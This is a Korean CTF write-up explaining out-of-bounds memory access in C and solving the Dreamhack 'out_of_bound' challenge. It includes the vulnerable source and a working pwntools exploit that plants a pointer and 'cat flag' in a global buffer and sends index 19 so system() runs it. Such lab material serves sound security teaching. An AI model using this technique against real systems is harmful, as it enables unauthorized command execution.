## Concept

OOB(Out Of Bound)는 프로그램이 배열이나 버퍼를 참조할 때 인덱스에 대한 검증이 미흡하여, 할당된 메모리 범위를 벗어난 영역을 읽거나 쓸 수 있는 취약점이다.

### 발생 원인

C/C++ 같은 언어는 배열 접근 시 인덱스 범위를 자동으로 검증하지 않는다. 크기가 5인 배열에 인덱스 10을 입력해도 컴파일 오류나 런타임 예외 없이 해당 주소의 값을 그대로 읽거나 덮어쓴다. 따라서 사용자 입력값을 검증 없이 배열 인덱스로 사용하면 취약점이 발생한다.

```c
int arr[5] = {1, 2, 3, 4, 5};
int idx;
scanf("%d", &idx);
printf("%d\n", arr[idx]); // idx가 5 이상이면 배열 범위 밖을 참조
```

### 메모리 구조와의 관계

배열은 메모리상에서 연속된 공간에 배치된다. OOB를 이용하면 배열 경계 밖, 즉 인접한 메모리 영역까지 접근할 수 있다. BSS/Data 영역의 전역 배열이라면 그 주변에 다른 전역 변수나 함수 포인터가 위치할 수 있고, 스택 영역의 지역 배열이라면 리턴 주소나 저장된 베이스 포인터(SFP)까지 접근 가능하다.

```
[ 낮은 주소 ]
+------------------+
|   command[0]     |  <-- "cat"
|   command[1]     |  <-- "ls"
|   ...            |
|   command[9]     |
+------------------+
|   (다른 전역변수)  |  <-- command[10], [11], ... 로 접근 가능
|   name[16]       |  <-- command[19] 처럼 오프셋 계산 후 참조 가능
+------------------+
[ 높은 주소 ]
```

### 공격 방식

OOB는 크게 **읽기(Read)**와 **쓰기(Write)** 두 가지 방식으로 악용된다.

- **OOB Read**: 범위 밖 메모리를 읽어 카나리 값, 스택 주소, 힙 주소 등 민감한 정보를 유출한다. ASLR이 적용된 환경에서 메모리 주소를 leak하는 데 활용된다.
- **OOB Write**: 범위 밖 메모리에 값을 써서 함수 포인터, GOT(Global Offset Table) 엔트리, 리턴 주소 등을 조작한다. 이를 통해 프로그램 흐름을 임의로 변경할 수 있다.

이 문제에서는 `command` 배열 너머에 위치한 전역 변수 `name`을 OOB Read로 참조하여, 미리 삽입해둔 문자열 주소를 `system()`에 전달하는 방식으로 익스플로잇한다.

## 문제

`out_of_bound` 문제는 OOB 취약점이 존재하는 서버에 요청을 보내 플래그를 획득하는 문제이다.

### 서비스 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```
{: file="out_of_bound.c"}

코드를 분석하면 `command[idx]`에 해당하는 명령어를 `system()`으로 실행하는 구조인데, `idx`에 대한 범위 검증이 전혀 없다. 따라서 배열 범위를 벗어난 인덱스를 입력하면 `command` 배열 이후의 메모리 주소를 포인터로 참조하게 되어, Concept에서 설명한 OOB Read 방식으로 임의의 명령어를 실행시킬 수 있다.

### 정상 동작 확인

익스플로잇에 앞서 pwntools로 정상적인 입력에 대한 동작을 먼저 확인해보자.

```python
from pwn import *
context.log_level = 'debug'

p = remote("host3.dreamhack.games", 18459)

p.recvuntil(b'Admin name: ')

payload = b"TESTADMINNAMES"
p.send(payload)

p.recvuntil(b"What do you want?: ")

# idx 0~4: cat, ls, id, ps, file ./oob 순서로 실행됨
p.sendline(b"1")  # ls 실행

p.recvline()
```
{: file="test.py"}

`command` 배열의 인덱스 0~4는 각각 `cat`, `ls`, `id`, `ps`, `file ./oob`에 대응된다. 위 코드를 실행하면 다음과 같이 정상적으로 명령어가 실행된다.

### 익스플로잇

OOB 취약점을 이용해 플래그를 읽어야 한다. 전략은 다음과 같다.

1. 전역 변수 `name`(16바이트)에 `cat flag` 문자열을 삽입한다.
2. `name` 버퍼의 앞 4바이트에는 `cat flag`가 시작되는 주소(`name_addr + 4`)를 포인터로 저장한다.
3. `command[idx]`가 해당 포인터를 참조하도록 적절한 `idx` 값을 계산해 입력한다. (i var -> 주소확인)

![idx값계산](/assets/img/posts/oob/calc.png)

`name(0x0804a0ac)`과 `command(0x0804a060)`의 주소 차이는 76바이트이고, 이를 포인터 크기(4바이트)로 나누면 19가 된다. → `idx = 19`

4. 결과적으로 `system("cat flag")`가 실행되어 플래그를 획득한다.

```python
from pwn import *
context.log_level = 'debug'

p = remote("host3.dreamhack.games", 20772)

name_addr = 0x0804a0ac

p.recvuntil(b'Admin name: ')

# name[0:4]: cat flag 문자열의 주소 (name_addr + 4)
# name[4:12]: 실제 "cat flag" 문자열
payload = p32(name_addr + 4) + b"cat flag"
p.send(payload)

p.recvuntil(b"What do you want?: ")

p.sendline(b"19")  # command 배열 기준 name 영역에 해당하는 인덱스

p.interactive()
```
